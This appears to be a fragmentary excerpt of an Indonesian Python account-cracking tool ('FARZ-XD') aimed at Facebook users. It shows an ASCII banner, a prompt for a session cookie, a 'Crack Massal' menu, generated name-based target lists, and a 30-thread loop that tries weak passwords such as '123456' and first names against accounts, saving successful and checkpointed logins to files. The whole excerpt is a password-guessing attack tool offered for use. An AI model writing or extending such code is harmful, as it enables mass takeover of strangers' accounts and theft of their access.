...
author = 'IKFAR IFC'
git_hub = 'github.com/IKFAR-IFC'
faceb0ok = 'IKFAR IFC XIXI'
version = 'FARZ-XD '
...
╠─── ██║     ██║  ██║██║  ██║███████╗    ██╔╝ ██╗██████╔╝
╠─── ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═════╝
╠─── Selamat Datang Pengguna Bernama {kk}{n}{P}, RECODE BY {kk}IKFAR-IFC{P} UNLIMITED""")
def logo2():
	return str(f""" 
╠─── ███████╗ █████╗ ██████╗ ███████╗    ██╗  ██╗██████╗ 
╠─── ██╔════╝██╔══██╗██╔══██╗╚══███╔╝    ╚██╗██╔╝██╔══██╗
...
╠─── ██║     ██║  ██║██║  ██║███████╗    ██╔╝ ██╗██████╔╝
╠─── ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═════╝
╠─── Selamat Datang Pengguna Bernama {kk}user{P}, RECODE BY {kk}IKFAR-IFC{P} UNLIMITED""")
...
def login():
	...
	clear_layar()
	print(logo2())
	cookie = input(f"\n╠───[{hh}>{P}] Masukkan Cookie, Atau Ketik '{kk}Get{P}' Untuk Cookie Gratis\n╠─── Cookie : ")
...
def menu(n,t,c):
	...
	print(f"╠───[{hh}02{P}] Crack Massal       [{hh}08{P}] Crack Dari Kile                               ║")
...
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['sayang','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','fahril','bagas','rafka','revan']
...
def crack_masal(t,c):
    ...
    try:
        bz=0
        apa = int(input(f'╠───[{hh}?{P}] Mau Berapa Target Cui : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
...
def manual():
	...
	for x in B:
		pwx.append(x)
	print(f"\r{P}╠────────────────────────────────────────────────────────────────")
	print(f'╠─── Farz OK Disimpan Di : {sim_ok}\n╠─── Farz CP Disimpan Di : {sim_cp}')
	print(f"\r{P}╠────────────────────────────────────────────────────────────────")
	awal = datetime.now()
...
def otomatis():
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = ['123456','sayang','bagong','kontol']
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
